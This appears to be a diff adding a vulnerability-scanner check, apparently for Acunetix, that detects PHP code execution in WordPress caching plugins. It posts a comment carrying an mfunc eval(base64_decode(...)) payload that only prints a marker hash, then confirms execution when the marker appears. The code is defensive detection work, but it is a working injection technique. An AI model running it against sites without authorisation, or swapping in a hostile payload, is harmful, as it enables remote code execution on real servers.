@@ -1,0 +1,125 @@
+#include constants.inc;
+#include helpers.inc;
+#include debug_helpers.inc;
+#include string_helpers.inc;
+var lastJob = null;
+var lastJob1 = null;
+// **************************************************************************************							 
+function request(dir, uri)
+{	
+	lastJob = new THTTPJob();
+	lastJob.verb = "GET";
+	lastJob.url  = dir.url;
+    lastJob.uri  = uri;
+    
+	lastJob.execute();
+	return (!lastJob.wasError); 
+}
+// **************************************************************************************							 
+function alert(uri, vxml, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/Wordpress";	
+	ri.setHttpInfo(lastJob1);
+	
+	if (matchedText) {
+		ri.Details =  ri.Details + "[break]Pattern found: [pre][blue]" + matchedText + "[/blue][/pre]";
+	}	
+	
+	AddReportItem(ri);	
+}	
+// **************************************************************************************							 
+function exploit(dir, root_path, postURL, commentId)
+{	
+	lastJob1 = new THTTPJob();
+	
+	lastJob1.autoRedirect = false;
+	lastJob1.addCookies = false;
+	
+	lastJob1.url = dir.url;
+	lastJob1.verb = "POST";
+	lastJob1.uri = root_path + "/wp-comments-post.php";
+	lastJob1.request.addHeader("Content-Type", "application/x-www-form-urlencoded", true);	        	
+	lastJob1.request.body = "author=acunetix" + randStr(8) + "&email=" + randStr(8) + "@" + randStr(12) + ".com&url=&comment=<%21--mfunc%20eval(base64_decode(cHJpbnQobWQ1KCdhY3VuZXRpeCcpKTsg));%20--><%21--/mfunc-->&submit=Post+Comment&comment_post_ID=" + commentId + "&comment_parent=0"; 
+	
+	lastJob1.execute();
+	
+	if (!lastJob1.wasError && lastJob1.response.msg2 == 302) {
+		//trace("comment posted");
+	
+		var cookieValues = new TStringList();
+		lastJob1.response.headerValues('Set-Cookie', cookieValues);
+		
+		var newLocation = lastJob1.response.headerValue('Location');
+		var cookieString = "";
+		if (newLocation) {
+			// prepare the final request
+			lastJob = new THTTPJob();
+			lastJob.url = dir.url;
+			lastJob.uri = postURL;
+			lastJob.verb = "GET";
+		
+			var foundCookies = false;
+			for (var i=0;i<cookieValues.count;i++){
+				var cookieValue = cookieValues.item(i);
+				if (cookieValue && cookieValue.indexOf(";") != -1) {
+					var cParts = cookieValue.split(";");
+					if (cParts.length > 1) {
+						var cookie = cParts[0];		
+						if (!foundCookies) foundCookies = true;
+						
+						cookieString = cookieString + cookie + "; ";
+						
+						//trace(cookie);
+					}
+				}
+			}		
+			
+			if (foundCookies) {
+				//trace("before exec");
+				lastJob.request.addHeader("Cookie", cookieString, true);
+				lastJob.execute();
+				//trace("after exec");				
+				
+				if (!lastJob.wasError && lastJob.response.msg2 == 200 && lastJob.response.body.indexOf("082119f75623eb7abd7bf357698ff66c") != -1) 
+				{
+					//trace("vulnerable");
+					alert(postURL, "wp_caching_plugins_php_exec.xml" ,"082119f75623eb7abd7bf357698ff66c");
+				}
+			}		
+		}
+	}
+}
+// **************************************************************************************
+function testCachingPluginsPHPCodeExecVuln(dir) {
+    var root_path = dir.fullPath;
+    if (root_path.charAt(root_path.length-1) != '/') root_path = root_path + '/';
+        
+    if (request(dir, root_path))
+    {
+		var linkRegex = /<span class="comments-link"><a href="(.*?)#(respond|comments)"\stitle="/;
+		var postURL = "";
+		
+		var m = linkRegex.exec(lastJob.response.body);
+		if (m && m.length >= 1 && m[1] && (request(dir, m[1]))) {
+			var up = new TURL(m[1]);
+			postURL = up.path;
+			//trace(m[1]);
+			//trace(lastJob.response.body);
+			
+			var commentIdRegex = /<input\s+type='hidden'\s+name='comment_post_ID'\s+value='(\d+)'/;
+			var m = commentIdRegex.exec(lastJob.response.body);
+			if (m && m.length >= 1 && m[1]) {
+				var commentId = m[1];
+				
+				// try to exploit
+				exploit(dir, root_path, postURL, commentId);
+			}			
+		}    	
+    }
+}    
+// main()
+var dir = getCurrentDirectory();
+testCachingPluginsPHPCodeExecVuln(dir);
